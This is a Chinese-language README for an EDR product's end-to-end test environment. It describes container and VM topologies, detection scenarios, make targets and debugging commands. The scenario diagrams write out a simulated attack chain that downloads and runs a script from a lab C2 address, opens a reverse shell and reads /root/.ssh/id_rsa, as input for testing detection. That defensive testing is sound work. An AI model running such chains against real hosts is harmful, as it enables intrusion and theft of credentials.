# SysArmor 测试环境

两种独立拓扑(容器 / VM),验证 EDR 采集能**跨 namespace 和终端类型**工作:
同一套场景与事实契约,不管 endpoint 是容器还是 VM,都应产出结构一致的 Event/Signal/Incident。

## 拓扑

```
容器拓扑 (docker compose)               VM 拓扑 (Vagrant + libvirt)
┌──────────────────────────────┐        ┌──────────┐ ┌──────────┐ ┌──────────┐
│ 宿主机内核                    │        │ attacker │ │  node-a  │ │   mgr    │
│  └─ Docker: sysarmor-net     │        │  VM(C2)  │ │ +tetragon│ │   VM     │
│      ├─ attacker  .99        │        │  独立内核  │ │  独立内核 │ │  独立内核 │
│      ├─ node-a    .11        │        └──────────┘ └──────────┘ └──────────┘
│      ├─ mgr       .10        │
│      └─ tetragon (eBPF 传感器)│        tetragon 在 VM 内核上直装
│                               │
│ tetragon 共享宿主内核          │        不需要 Docker
└──────────────────────────────┘
```

## 场景设计

每个场景是一份**契约**:给定攻击输入,系统必须(或不)产出指定的 Event/Signal/Incident。

| 场景 | ATT&CK | 核心命题 | Incident |
|---|---|---|---|
| **apt-fileless-c2** | T1190→T1059→T1105→T1571 | "响"的攻击:端侧产 terminal,云端缝合 | =1 |
| **apt-staged-drop** | T1105+T1574 | 云端图立论:跨 lineage,端侧无 terminal | =1 |
| **benign-ci-noise** | 误报基准 | 罕见度≠裸加:良性 CI 不产 Incident | =0 |

三场景构成最小完备集:正向(有攻击应检出)+ 横向(跨 lineage) + 负向(无攻击不误报)。

### apt-fileless-c2 (Log4Shell 风格)

```
java-web → bash → curl 10.66.0.99:8080/x.sh → bash /dev/shm/x.sh
                                                    ↓
                                              反弹 shell → 10.66.0.99:443
                                              后渗透: cat /root/.ssh/id_rsa
```

端侧单 lineage 内形成完整攻击链,产 terminal Signal。云端缝合成 Incident。
契约要点:端侧必须产 terminal,Incident=1,证据子图包含 bash→x.sh→C2 路径。

### apt-staged-drop (跨 lineage 分阶段)

```
lineage A (CI 构建): curl → 10.66.0.99:8080/helper → /var/lib/app/plugins/helper
                     ──── 间隔 GAP 秒 ────
lineage B (应用加载): /var/lib/app/plugins/helper --report 10.66.0.99:443
```

落盘与执行分属不同 lineage,端侧任一 lineage 都不产 terminal。
只有云端 provenance graph 通过共享文件节点 `/var/lib/app/plugins/helper` 缝合,才能成案。
契约要点:端侧无 terminal,Incident=1,lineage_ids≥2,证据子图含 helper 节点。control:关闭 cross_lineage 则 Incident=0。

### benign-ci-noise (良性 CI 噪音)

```
CI 构建 ×N 轮: curl → 10.66.0.99:8080 (拉依赖) → 编译 → 写 artifact
```

行为模式与攻击高度相似(curl 外联+文件写入+执行),但完全合法。
核心断言:Incident=0 (罕见度+结构收敛不误报)。
control:切换为 additive_threshold 则误报(Incident≥1),证明裸加是反模式。

## 目录结构

```
test/
├── Makefile                 e2e 入口
│
├── env/                     搭建:拓扑定义 + 镜像 + 资源
│   ├── container/
│   │   ├── compose.yaml      容器拓扑声明
│   │   └── images/           Dockerfile (attacker / node-a / mgr)
│   ├── vm/
│   │   ├── Vagrantfile       VM 拓扑声明
│   │   └── provision/        install-tetragon / setup-c2 / setup-credentials
│   └── resources/            共享资源
│       ├── syscall-capture.yaml   replay/debug/perf 兼容 TracingPolicy
│       └── registry-token         假凭据
│
├── scenarios/               执行:攻击脚本 + 期望契约
│   ├── container/            容器拓扑场景 (docker exec 触发)
│   └── vm/                   VM 拓扑场景 (vagrant ssh 触发)
│
├── policies/                PolicyEnvelope 契约 (agent 配置,待接入)
│
├── harness/                 编排:start / stop / capture / assert / report
│
└── .results/                抓包样本
```

一句话:
- **env/** = 搭环境(搭完不动)
- **scenarios/** = 跑什么(攻击输入+断言)
- **policies/** = agent 契约(待接入)
- **harness/** = 怎么跑(生命周期+采集+判对错)

## 快速开始

```bash
# 容器拓扑: build → manager/agent replay → sysarmorctl assert
make e2e TOPO=container SCENARIO=apt-fileless-c2
make e2e TOPO=container SCENARIO=apt-staged-drop
make e2e TOPO=container SCENARIO=benign-ci-noise

# VM 拓扑: VM 内执行场景和抓 Tetragon,复用同一 manager/CLI 契约
make e2e TOPO=vm SCENARIO=apt-fileless-c2
make e2e TOPO=vm SCENARIO=apt-staged-drop
make e2e TOPO=vm SCENARIO=benign-ci-noise

# VM systemd + real Tetragon subscription smoke
make e2e-agent-real-tetragon-vm

# VM systemd + agent-owned real Tetragon process smoke
make e2e-agent-real-tetragon-owned-vm

# container + agent-owned real Tetragon process smoke
make e2e-agent-real-tetragon-owned-container

# 生命周期 smoke
make e2e TOPO=container SCENARIO=lifecycle-smoke
make e2e TOPO=vm SCENARIO=lifecycle-smoke

# graceful shutdown / spool flush smoke
make e2e-agent-shutdown

# startup capability/bundle failure -> degraded health
make e2e-agent-capability

# upload retry/backoff soak
make e2e-agent-retry-backoff

# parse error health / tamper smoke
make e2e-agent-parse-health

# queue backpressure/drop health smoke
make e2e-agent-backpressure

# 性能基线 smoke
make perf TOPO=container DUR=10
make perf TOPO=vm DUR=10

# 资源占用采样: 容器看宿主机上的 EDR 容器/进程占用,VM 看 node-a 内部进程占用
make perf-resource TOPO=container SCENARIO=idle DUR=30
make perf-resource TOPO=vm SCENARIO=idle DUR=30

# 汇总
make report

# 清理
make clean                           # down + 删 .results/
```

## 当前产品链路

MVP / v2 container 和 VM 主运行路径是:

```
sysarmor-agent run --config ...（agent-managed tetra getevents）
  → normalize + fastpath
  → durable spool + upload worker
  → sysarmor-manager Link1 upload/analytics/store
  → sysarmorctl JSON query
  → harness/assert.py
```

agent 默认用 HTTP upload 兼容 e2e;也支持 gRPC Link1:

```bash
docker exec mgr /opt/sysarmor/bin/sysarmor-agent \
  --transport grpc --manager 127.0.0.1:9444 \
  --scenario grpc-smoke --input-jsonl /tmp/lifecycle.sensor.jsonl
```

`capture-container` 和 `capture-vm` 默认启动 v2 daemon,由 agent 托管 `tetra getevents` 订阅并 apply runtime policy。container 拓扑会按 `node-a` 的 Docker container id 过滤 Tetragon 事件,避免宿主机或其他容器噪音淹没场景事件。
如需回归 v1 调试路径,可使用 `CAPTURE_MODE=replay make capture TOPO=container SCENARIO=...` 或 `CAPTURE_MODE=replay make capture TOPO=vm SCENARIO=...`;该模式仍会保留实际喂给 agent 的 Tetragon 样本到 `.results/*.tetragon.jsonl`,并用 `replay_scenario.py` 上传契约级 SensorEvent。
agent 也仍支持直接读取 Tetragon raw JSONL,用于 raw adapter smoke。

## 常用调试

```bash
# 查询 manager 健康
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 status --json

# 查询信号和事件
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 signals --scenario apt-fileless-c2 --layer endpoint --json
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 events --scenario lifecycle-smoke --kind EXEC --json

# control assertion: 反事实重算,不污染 store
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario apt-staged-drop --disable cloud.cross_lineage --json
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario benign-ci-noise --mode additive_threshold --json

# raw Tetragon adapter smoke
docker cp .results/apt-fileless-c2.vm.tetragon.jsonl tetragon:/tmp/raw.jsonl
docker exec tetragon /opt/sysarmor/bin/sysarmor-agent --manager http://10.66.0.10:9443 --scenario raw-fileless --stream-jsonl /tmp/raw.jsonl
```

## 前提

| 拓扑 | 需要 |
|---|---|
| 容器 | Docker Compose v2 |
| VM | libvirt + vagrant-libvirt |

## 注意事项

- 容器镜像源:`docker.1panel.live`(实测可用);`docker.1ms.run` 坏的。
- 容器内 apt 源需 sed 为 `mirrors.edge.kernel.org` + 关 https 校验。
- VM tetragon 从 GitHub release 下载 tarball;VM 内 GitHub 被墙时需手动下载。
- VM provision 默认不再预加载 `syscall-capture.yaml`;如需兼容 replay/debug/perf，可在 provision 时显式设置 `SYSARMOR_PRELOAD_VM_POLICY=1`。
- 容器拓扑 tetragon `--pid=host`,当前靠 TracingPolicy selector 过滤噪音;后续可加 `--cgroup-filter`。
- VM 拓扑修改脚本后需 `make provision`(rsync + re-provision)。
- VM topology 在 `mgr` VM 内运行 `sysarmor-manager` 和 `sysarmorctl`,在 `node-a` VM 内运行 agent stream。
- `perf-getevents` 是短窗口采集吞吐 baseline smoke,EPS 可能为 0。
- `perf-resource` 是 EDR 资源占用采样入口,输出 `.results/perf-resource.<topo>.<scenario>.csv`;容器拓扑看宿主机上的 `tetragon`/`sysarmor-agent` 相关占用,VM 拓扑看 `node-a` 内部的 `sysarmor-agent`/`tetragon`/`tetra` 进程占用。正式评估时应分别跑 baseline、EDR idle、EDR business、EDR detection,并对比业务延迟/吞吐。
